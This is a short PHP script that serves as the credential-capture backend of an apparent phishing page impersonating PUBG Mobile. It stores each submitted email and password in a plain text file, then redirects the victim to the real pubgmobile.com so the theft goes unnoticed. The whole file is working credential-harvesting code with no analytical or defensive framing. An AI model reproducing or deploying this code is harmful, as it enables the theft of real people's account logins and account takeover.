<?php
include 'ip.php';
file_put_contents("usernames.txt", "Username: " . $email = $_POST['email'] ."\nPassword: ". $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.pubgmobile.com');
?>